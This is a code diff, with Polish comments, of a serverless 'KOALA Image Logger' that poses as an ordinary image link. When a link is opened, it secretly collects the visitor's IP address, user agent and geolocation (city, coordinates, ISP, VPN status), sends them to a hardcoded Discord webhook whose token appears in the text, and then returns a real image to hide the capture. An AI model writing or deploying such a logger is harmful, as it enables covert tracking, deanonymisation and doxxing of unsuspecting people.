@@ -1,12 +1,12 @@
 // ====================== KOALA IMAGE LOGGER ======================
-// Zwraca prawdziwy obrazek – Discord wyświetli go automatycznie
+// Działa jak hotdog-img.vercel.app – prosty link, obrazek, logowanie IP
 
 const YOUR_WEBHOOK = "https://discord.com/api/webhooks/1486439184737763400/ZoSv_Z_nl3orhOavk5gf7IT_Tlkj20GR0yL29aVzrWncfhJ6IiWFWrOz_MQmpaPjc4RZ";
 
-// Obrazek, który będzie widoczny – działa, bo jest na CDN Discorda
+// Stały obrazek – możesz go zmienić na dowolny URL (musi istnieć)
 const IMAGE_URL = "https://cdn.discordapp.com/attachments/1054650838129332255/1153307620187312168/convert.png";
 
-// Funkcja do pobierania geolokalizacji (opcjonalna – można dodać później)
+// Funkcja do geolokalizacji (opcjonalna)
 async function getGeo(ip) {
     try {
         const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,as,mobile,proxy,timezone`);
@@ -25,10 +25,10 @@ export default async function handler(req, res) {
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const time = new Date().toLocaleString();
 
-    // Opcjonalnie: geolokalizacja
+    // Geolokalizacja
     const geo = await getGeo(ip);
 
-    // Przygotuj wiadomość
+    // Wiadomość
     let message = `[+] KOALA Image Logger - IP Logged\nA User Opened the Original Image!\n\nEndpoint: /api/hotdog\n\nIP Info:\nIP: ${ip}\n`;
     if (geo) {
         message += `Provider: ${geo.isp || 'Unknown'}\nASN: ${geo.as || 'Unknown'}\nCountry: ${geo.country || 'Unknown'}\nRegion: ${geo.regionName || 'Unknown'}\nCity: ${geo.city || 'Unknown'}\nCoords: ${geo.lat || '?'}, ${geo.lon || '?'}\nTimezone: ${geo.timezone || 'Unknown'}\nMobile: ${geo.mobile ? 'True' : 'False'}\nVPN: ${geo.proxy ? 'True' : 'False'}\n`;
@@ -48,11 +48,10 @@ export default async function handler(req, res) {
         console.error(err);
     }
 
-    // Pobierz obrazek
+    // Pobierz i zwróć obrazek
     const imageResp = await fetch(IMAGE_URL);
     const imageBuffer = await imageResp.arrayBuffer();
 
-    // Zwróć obrazek – Discord wyświetli go automatycznie
     res.setHeader('Content-Type', 'image/png');
     res.setHeader('Cache-Control', 'no-cache');
     res.send(Buffer.from(imageBuffer));
